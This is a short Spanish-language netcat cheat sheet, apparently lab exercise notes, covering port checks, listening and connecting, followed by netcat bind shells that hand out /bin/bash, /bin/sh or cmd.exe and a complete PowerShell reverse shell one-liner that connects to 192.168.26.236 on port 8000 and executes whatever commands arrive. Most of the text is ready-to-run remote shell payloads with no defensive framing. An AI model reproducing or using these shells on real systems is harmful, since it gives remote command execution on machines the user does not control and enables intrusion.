
# Ejercicios Netcat

Opciones de netcat:
`nc -h`

Verificar si un puerto esta abierto:  
`nc -v 192.168.26.236 80`

Escuchar en un puerto por conexiones entrantes:  
`nc -lvp 8000`

Conectarse a un puerto:  
`nc 192.168.26.236 8000`

Escuchar en un puerto por conexiones entrantes y ejecutar la aplicacion selecionada con la opcion -e  
`nc -lvp 8000 -e /bin/bash`  
`nc -lvp 8000 -e /bin/sh`  
`nc.exe -lvp 8000 -e c:\windows\system32\cmd.exe`  

# Powershell Reverse Shell One Liner 
### by Nikhil SamratAshok Mittal @samratashok

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.26.236",8000);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
